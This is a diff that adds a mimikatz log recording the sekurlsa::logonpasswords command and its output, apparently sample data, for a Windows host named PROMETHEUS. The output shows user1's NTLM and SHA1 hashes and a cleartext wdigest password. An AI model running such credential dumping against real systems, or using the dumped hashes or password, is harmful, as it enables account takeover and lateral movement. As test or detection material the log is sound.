@@ -1,0 +1,51 @@
+Using 'sekurlsa.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 129317 (00000000:0001f925)
+Session           : Interactive from 1
+User Name         : user1
+Domain            : PROMETHEUS
+Logon Server      : PROMETHEUS
+Logon Time        : 24.03.2015 09:56:03
+SID               : S-1-5-21-949666807-3097873-177000209-1000
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : d3ac35adee9b80aefa92966bfe188758
+	 * SHA1     : 2bf7f461915af759ac5ebb7520c4babb609967e9
+	 [00000003] Primary
+	 * Username : user1
+	 * Domain   : PROMETHEUS
+	 * NTLM     : d3ac35adee9b80aefa92966bfe188758
+	 * SHA1     : 2bf7f461915af759ac5ebb7520c4babb609967e9
+	tspkg :	
+	wdigest :	
+	 * Username : user1
+	 * Domain   : PROMETHEUS
+	 * Password : MasterPass123!
+	kerberos :	
+	 * Username : user1
+	 * Domain   : PROMETHEUS
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 24.03.2015 09:55:58
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
